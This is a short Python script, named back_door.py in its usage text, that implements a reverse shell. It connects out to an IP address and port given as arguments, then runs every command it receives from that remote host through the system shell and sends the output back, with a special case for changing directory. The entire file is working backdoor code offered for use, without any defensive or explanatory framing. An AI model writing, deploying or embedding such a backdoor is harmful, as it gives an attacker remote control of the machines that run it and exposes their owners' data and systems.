import os
import socket
import sys
import subprocess

def usage():
    print('''
    -----------------------------
    #back_door.py <ip_target> <porta>
    -----------------------------
    ''')
    exit()

if len(sys.argv) != 3:
    usage()

try:
    s = socket.socket()
    s.connect((sys.argv[1], int(sys.argv[2])))
    s.send(b'# # # Connected to user # # #\n')
except Exception as e:
    print(f"Connection error: {e}")
    sys.exit(1)

while True:
    try:
        data = s.recv(1024).decode("utf-8").strip()
        
        if not data:
            continue
        
        if data.lower() == "q":
            s.close()
            break
        
        if data.startswith('cd '):
            try:
                os.chdir(data[3:].strip())
                s.send(f'Moving to: {os.getcwd()}\n'.encode())
            except FileNotFoundError:
                s.send(b'Error: Directory not found\n')
        else:
            result = subprocess.run(data, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            s.send(output.encode() if output else b'Command did not return output\n')
    except Exception as e:
        s.send(f'Error: {str(e)}\n'.encode())
